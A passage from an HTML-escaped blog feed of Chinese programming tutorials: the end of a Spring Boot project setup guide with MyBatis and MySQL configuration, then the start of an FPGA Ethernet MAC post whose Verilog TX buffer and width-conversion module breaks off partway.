&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('17439fed-a85b-4402-9a97-41e1c818b557')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_17439fed-a85b-4402-9a97-41e1c818b557&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_17439fed-a85b-4402-9a97-41e1c818b557&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('17439fed-a85b-4402-9a97-41e1c818b557',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_17439fed-a85b-4402-9a97-41e1c818b557&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.zuche;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.mybatis.spring.annotation.MapperScan;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.boot.SpringApplication;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.boot.autoconfigure.SpringBootApplication;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.ComponentScan;

@SpringBootApplication
@ComponentScan(basePackages &lt;/span&gt;= {&quot;com.athm.controller&quot;,&quot;com.athm.service&quot;&lt;span&gt;})
@MapperScan(basePackages &lt;/span&gt;= {&quot;com.athm.dao&quot;&lt;span&gt;})
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ZucheApplication {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        SpringApplication.run(ZucheApplication.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;, args);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;添加数据库连接相关配置，application.properties&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;spring.datasource.url=jdbc:mysql://localhost:3306/zuche
spring.datasource.username=toutou
spring.datasource.password=*******
spring.datasource.driver-class-name=com.mysql.jdbc.Driver&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;按如下提示运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915163731075-849379661.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;浏览器输入得到效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915163743173-1122091494.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_3&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;github地址&lt;/h2&gt;
&lt;p&gt;&lt;a title=&quot;hystrix&quot; href=&quot;https://github.com/toutouge/javademo/tree/master/zuche_test/zuche&quot; target=&quot;_blank&quot;&gt;https://github.com/toutouge/javademo/tree/master/zuche_test/zuche&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_4&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;博客总结&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;系统故障常常都是不可预测且难以避免的，因此作为系统设计师的我们，必须要提前预设各种措施，以应对随时可能的系统风险。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div id=&quot;MySignature&quot; readability=&quot;9.0030211480363&quot;&gt;
&lt;p id=&quot;PSignature&quot;&gt;&lt;br/&gt;作　　者：&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;请叫我头头哥&lt;/a&gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;出　　处：&lt;a href=&quot;http://www.cnblogs.com/toutou/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/toutou/&lt;/a&gt;&lt;br/&gt;关于作者：专注于基础平台的项目开发。如有问题或建议，请多多赐教！&lt;br/&gt;版权声明：本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。&lt;br/&gt;特此声明：所有评论和私信都会在第一时间回复。也欢迎园子的大大们指正错误，共同进步。或者&lt;a href=&quot;http://msg.cnblogs.com/msg/send/%E8%AF%B7%E5%8F%AB%E6%88%91%E5%A4%B4%E5%A4%B4%E5%93%A5&quot;&gt;直接私信&lt;/a&gt;我&lt;br/&gt;声援博主：如果您觉得文章对您有帮助，可以点击文章右下角&lt;strong&gt;&lt;span&gt;【&lt;a id=&quot;post-up&quot; href=&quot;javascript:void(0);&quot;&gt;推荐&lt;/a&gt;】&lt;/span&gt;&lt;/strong&gt;一下。您的鼓励是作者坚持原创和持续写作的最大动力！&lt;br/&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Sun, 07 Oct 2018 13:58:00 +0000</pubDate>
<dc:creator>请叫我头头哥</dc:creator>
<og:description>Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/toutou/p/9650939.html</dc:identifier>
</item>
<item>
<title>FPGA设计千兆以太网MAC（3）——数据缓存及位宽转换模块设计与验证 - 没落骑士</title>
<link>http://www.cnblogs.com/moluoqishi/p/9751652.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/moluoqishi/p/9751652.html</guid>
<description>&lt;p&gt;　&lt;span&gt;　本文设计思想采用明德扬至简设计法。&lt;/span&gt;&lt;span&gt;上一篇博文中定制了自定义MAC IP的结构，在用户侧需要位宽转换及数据缓存。本文以TX方向为例，设计并验证发送缓存模块。这里定义该模块可缓存4个最大长度数据包，用户根据需求改动即可。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　该模块核心是利用异步FIFO进行跨时钟域处理，位宽转换由VerilogHDL实现。需要注意的是用户数据包位宽32bit，因此包尾可能有无效字节，而转换为8bit位宽数据帧后是要丢弃无效字节的。内部逻辑非常简单，直接上代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44.5&quot;&gt;&lt;img id=&quot;code_img_closed_d78f4575-3262-4347-8f91-d23ecad1e0d5&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_d78f4575-3262-4347-8f91-d23ecad1e0d5&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d78f4575-3262-4347-8f91-d23ecad1e0d5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;84&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; `timescale 1ns /&lt;span&gt; 1ps
&lt;/span&gt;&lt;span&gt;  2&lt;/span&gt; 
&lt;span&gt;  3&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Description: MAC IP TX方向用户数据缓存及位宽转换模块
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 整体功能：将TX方向用户32bit位宽的数据包转换成8bit位宽数据包
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用户侧时钟100MHZ，MAC侧125MHZ
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;缓存深度：保证能缓存4个最长数据包，TX方向用户数据包包括
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;目的MAC地址  源MAC地址 类型/长度 数据 最长1514byte&lt;/span&gt;
&lt;span&gt;  8&lt;/span&gt; 
&lt;span&gt;  9&lt;/span&gt; 
&lt;span&gt; 10&lt;/span&gt; &lt;span&gt;module&lt;/span&gt; tx_buffer#(&lt;span&gt;parameter&lt;/span&gt; DATA_W = &lt;span&gt;32&lt;/span&gt;)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;位宽不能改动&lt;/span&gt;
&lt;span&gt; 11&lt;/span&gt; &lt;span&gt;(
&lt;/span&gt;&lt;span&gt; 12&lt;/span&gt;     
&lt;span&gt; 13&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;全局信号&lt;/span&gt;
&lt;span&gt; 14&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;                         rst_n,&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保证拉低三个时钟周期，否则FIF可能不会正确复位
&lt;/span&gt;&lt;span&gt; 15&lt;/span&gt; 
&lt;span&gt; 16&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用户侧信号&lt;/span&gt;
&lt;span&gt; 17&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;&lt;span&gt;                         user_clk,
&lt;/span&gt;&lt;span&gt; 18&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;         [DATA_W-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]     din,
&lt;/span&gt;&lt;span&gt; 19&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;&lt;span&gt;                         din_vld,
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;&lt;span&gt;                         din_sop,
&lt;/span&gt;&lt;span&gt; 21&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;&lt;span&gt;                         din_eop,
&lt;/span&gt;&lt;span&gt; 22&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;         [&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]         din_mod,
&lt;/span&gt;&lt;span&gt; 23&lt;/span&gt;     &lt;span&gt;output&lt;/span&gt;&lt;span&gt;                         rdy,
&lt;/span&gt;&lt;span&gt; 24&lt;/span&gt; 
&lt;span&gt; 25&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;MAC侧信号&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt;     &lt;span&gt;input&lt;/span&gt;&lt;span&gt;                         eth_tx_clk,
&lt;/span&gt;&lt;span&gt; 27&lt;/span&gt;     &lt;span&gt;output&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;     [&lt;span&gt;8&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]         dout,
&lt;/span&gt;&lt;span&gt; 28&lt;/span&gt;     &lt;span&gt;output&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt;                     dout_sop,
&lt;/span&gt;&lt;span&gt; 29&lt;/span&gt;     &lt;span&gt;output&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt;                     dout_eop,
&lt;/span&gt;&lt;span&gt; 30&lt;/span&gt;     &lt;span&gt;output&lt;/span&gt; &lt;span&gt;reg&lt;/span&gt;&lt;span&gt;                     dout_vld
&lt;/span&gt;&lt;span&gt; 31&lt;/span&gt; &lt;span&gt;    );
&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt; 
&lt;span&gt; 33&lt;/span&gt; 
&lt;span&gt; 34&lt;/span&gt;     &lt;span&gt;reg&lt;/span&gt; wr_en = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 35&lt;/span&gt;     &lt;span&gt;reg&lt;/span&gt; [DATA_W+&lt;span&gt;4&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;] fifo_din = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt;     &lt;span&gt;reg&lt;/span&gt; [ (&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;):&lt;span&gt;0&lt;/span&gt;]  rd_cnt = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;     ;
&lt;/span&gt;&lt;span&gt; 37&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt;        add_rd_cnt ;
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt;        end_rd_cnt ;
&lt;/span&gt;&lt;span&gt; 39&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; rd_en;
&lt;/span&gt;&lt;span&gt; 40&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt; [DATA_W+&lt;span&gt;4&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;:&lt;span&gt;0&lt;/span&gt;&lt;span&gt;] fifo_dout;
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; rst;
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt;     &lt;span&gt;reg&lt;/span&gt; [ (&lt;span&gt;2&lt;/span&gt;-&lt;span&gt;1&lt;/span&gt;):&lt;span&gt;0&lt;/span&gt;]  rst_cnt =&lt;span&gt;0&lt;/span&gt;&lt;span&gt;    ;
&lt;/span&gt;&lt;span&gt; 43&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt;        add_rst_cnt ;
&lt;/span&gt;&lt;span&gt; 44&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt;        end_rst_cnt ;
&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt;     &lt;span&gt;reg&lt;/span&gt; rst_flag = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 46&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt; [&lt;span&gt;11&lt;/span&gt; : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;] wr_data_count;
&lt;/span&gt;&lt;span&gt; 47&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; empty;
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt;     &lt;span&gt;wire&lt;/span&gt;&lt;span&gt; full;
&lt;/span&gt;&lt;span&gt; 49&lt;/span&gt; 
&lt;span&gt; 50&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;***************************************写侧************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 51&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; user_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 52&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt; 53&lt;/span&gt;         wr_en &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 55&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(rdy)
&lt;/span&gt;&lt;span&gt; 56&lt;/span&gt;         wr_en &amp;lt;=&lt;span&gt; din_vld;
&lt;/span&gt;&lt;span&gt; 57&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 58&lt;/span&gt; 
&lt;span&gt; 59&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; user_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 60&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt; 61&lt;/span&gt;         fifo_din &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt; 62&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 63&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;begin&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;[35] din_sop    [34] din_eop    [33:32] din_mod    [31:0] din&lt;/span&gt;
&lt;span&gt; 64&lt;/span&gt;         fifo_din &amp;lt;=&lt;span&gt; {din_sop,din_eop,din_mod,din};
&lt;/span&gt;&lt;span&gt; 65&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 66&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 67&lt;/span&gt; 
&lt;span&gt; 68&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; rdy = wr_data_count &amp;lt;= &lt;span&gt;1516&lt;/span&gt; &amp;amp;&amp;amp; !rst &amp;amp;&amp;amp; !rst_flag &amp;amp;&amp;amp; !&lt;span&gt;full;
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt; 
&lt;span&gt; 70&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;***************************************读侧************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 71&lt;/span&gt; 
&lt;span&gt; 72&lt;/span&gt; &lt;span&gt;always&lt;/span&gt; @(&lt;span&gt;posedge&lt;/span&gt; eth_tx_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n) &lt;span&gt;begin&lt;/span&gt; 
&lt;span&gt; 73&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (rst_n==&lt;span&gt;0&lt;/span&gt;) &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 74&lt;/span&gt;         rd_cnt &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt; 75&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 76&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rd_cnt) &lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 77&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(end_rd_cnt)
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt;             rd_cnt &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; 
&lt;/span&gt;&lt;span&gt; 79&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;
&lt;span&gt; 80&lt;/span&gt;             rd_cnt &amp;lt;= rd_cnt+&lt;span&gt;1&lt;/span&gt;&lt;span&gt; ;
&lt;/span&gt;&lt;span&gt; 81&lt;/span&gt;    &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 82&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 83&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; add_rd_cnt = (!&lt;span&gt;empty);
&lt;/span&gt;&lt;span&gt; 84&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; end_rd_cnt = add_rd_cnt  &amp;amp;&amp;amp; rd_cnt == (&lt;span&gt;4&lt;/span&gt;)-&lt;span&gt;1&lt;/span&gt;&lt;span&gt; ;
&lt;/span&gt;&lt;span&gt; 85&lt;/span&gt; 
&lt;span&gt; 86&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; rd_en =&lt;span&gt; end_rd_cnt;
&lt;/span&gt;&lt;span&gt; 87&lt;/span&gt; 
&lt;span&gt; 88&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; eth_tx_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 89&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt; 90&lt;/span&gt;         dout &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 91&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 92&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rd_cnt)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 93&lt;/span&gt;         dout &amp;lt;= fifo_dout[DATA_W-&lt;span&gt;1&lt;/span&gt;-rd_cnt*&lt;span&gt;8&lt;/span&gt; -:&lt;span&gt;8&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt; 94&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 95&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt; 96&lt;/span&gt; 
&lt;span&gt; 97&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; eth_tx_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt; 98&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt; 99&lt;/span&gt;         dout_vld &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;101&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rd_cnt &amp;amp;&amp;amp; ((rd_cnt &amp;lt;= &lt;span&gt;3&lt;/span&gt; - fifo_dout[&lt;span&gt;33&lt;/span&gt;:&lt;span&gt;32&lt;/span&gt;] &amp;amp;&amp;amp; fifo_dout[&lt;span&gt;34&lt;/span&gt;]) || !fifo_dout[&lt;span&gt;34&lt;/span&gt;]))&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;102&lt;/span&gt;         dout_vld &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;103&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;104&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;105&lt;/span&gt;         dout_vld &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;106&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;107&lt;/span&gt; 
&lt;span&gt;108&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; eth_tx_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;109&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt;110&lt;/span&gt;         dout_sop &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;112&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rd_cnt &amp;amp;&amp;amp; rd_cnt == &lt;span&gt;0&lt;/span&gt; &amp;amp;&amp;amp; fifo_dout[&lt;span&gt;35&lt;/span&gt;])&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;113&lt;/span&gt;         dout_sop &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;114&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;115&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;116&lt;/span&gt;         dout_sop &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt; ;
&lt;/span&gt;&lt;span&gt;117&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;118&lt;/span&gt; 
&lt;span&gt;119&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; eth_tx_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;120&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(rst_n==&lt;span&gt;1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;b0)begin&lt;/span&gt;
&lt;span&gt;121&lt;/span&gt;         dout_eop &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;122&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;123&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(add_rd_cnt &amp;amp;&amp;amp; rd_cnt == &lt;span&gt;3&lt;/span&gt; - fifo_dout[&lt;span&gt;33&lt;/span&gt;:&lt;span&gt;32&lt;/span&gt;] &amp;amp;&amp;amp; fifo_dout[&lt;span&gt;34&lt;/span&gt;])&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;124&lt;/span&gt;         dout_eop &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;125&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;126&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;127&lt;/span&gt;         dout_eop &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;128&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;129&lt;/span&gt; 
&lt;span&gt;130&lt;/span&gt; 
&lt;span&gt;131&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt;*****************************FIFO复位逻辑***************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;132&lt;/span&gt; &lt;span&gt;assign&lt;/span&gt; rst = !rst_n ||&lt;span&gt; rst_flag;
&lt;/span&gt;&lt;span&gt;133&lt;/span&gt; 
&lt;span&gt;134&lt;/span&gt; &lt;span&gt;always&lt;/span&gt;  @(&lt;span&gt;posedge&lt;/span&gt; user_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n)&lt;span&gt;begin&lt;/span&gt; 
&lt;span&gt;135&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt;(!rst_n)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;136&lt;/span&gt;         rst_flag &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;137&lt;/span&gt;     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;138&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;&lt;span&gt;(end_rst_cnt)
&lt;/span&gt;&lt;span&gt;139&lt;/span&gt;         rst_flag &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;140&lt;/span&gt; &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;141&lt;/span&gt; 
&lt;span&gt;142&lt;/span&gt; &lt;span&gt;always&lt;/span&gt; @(&lt;span&gt;posedge&lt;/span&gt; user_clk &lt;span&gt;or&lt;/span&gt; &lt;span&gt;negedge&lt;/span&gt; rst_n) &lt;span&gt;begin&lt;/span&gt; 
